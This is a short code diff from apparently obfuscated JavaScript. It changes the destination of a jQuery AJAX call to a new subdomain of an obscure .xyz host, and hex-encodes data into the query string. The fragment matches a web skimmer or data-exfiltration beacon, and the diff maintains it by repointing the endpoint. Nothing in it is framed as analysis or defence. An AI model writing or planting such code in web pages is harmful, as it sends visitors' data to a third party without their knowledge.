@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://apiiv1.pronxy-surya.xyz?cat=" +
+                    "https://jsdcoding.pronxy-surya.xyz?cat=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
